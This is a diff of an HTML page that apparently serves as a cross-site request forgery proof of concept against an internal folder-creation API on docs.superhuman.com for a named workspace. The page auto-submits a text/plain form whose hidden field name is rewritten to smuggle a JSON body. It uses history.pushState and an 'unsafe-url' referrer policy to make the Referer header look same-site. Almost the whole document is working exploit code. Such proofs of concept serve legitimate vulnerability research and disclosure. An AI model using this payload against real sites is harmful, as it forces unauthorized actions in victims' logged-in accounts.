@@ -2,18 +2,27 @@
 <html>
   <head>
     <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
-    <meta name="referrer" content="never">
-    <script>
+    <meta name="referrer" content="unsafe-url" />
+  </head>
+<body>
+      <script>
+      history.pushState("", "", "/")
+    </script>
+  <form id="f" ENCTYPE="text/plain" action="https://docs.superhuman.com/internalAppApi/workspaces/ws-96RE0OTDqM/folders" method="post">
+    <input id="z" type="hidden" name='test' value='test"}'>
+  </form>
+    <script>      
+      // You need to set this or the domain won't appear in the query of the referer header
+      history.pushState(
+        "",
+        "",
+        "https://docs.superhuman.com/workspaces/ws-96RE0OTDqM/folders"
+      )
       $(document).ready(
         function() {
           $("#z").attr("name",'{"name":"test-csrf","icon":null,"iconColor":null,"description":"csrf-attack","fakeparam":"');
           $('#f').trigger('submit');
       });
     </script>
-  </head>
-<body>
-  <form id="f" ENCTYPE="text/plain" action="https://docs.superhuman.com/internalAppApi/workspaces/ws-96RE0OTDqM/folders" method="post">
-    <input id="z" type="hidden" name='test' value='test"}'>
-  </form>
 </body>
 </html>
